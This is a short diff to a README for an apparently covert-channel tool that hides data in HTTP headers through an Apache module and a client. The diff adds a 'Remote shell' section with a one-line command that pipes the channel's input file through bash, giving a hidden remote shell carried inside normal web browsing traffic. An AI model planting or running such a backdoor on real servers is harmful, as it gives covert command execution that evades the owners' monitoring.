@@ -75,8 +75,12 @@ Where **knockcode** is just what you configured in Apache, **length** is a 3 byt
 knock005hello
 ```
 
-
-
+Remote shell
+------------
+If the input and output files are piped through bash, you can obtain a remote shell (together with steg-client) that communicates exclusively through the http headers of the normal web requests you make while browsing that server's web content:
+```
+tail -f /var/steg/input | bash 2>/var/steg/output 1>&2
+```
 
 
 
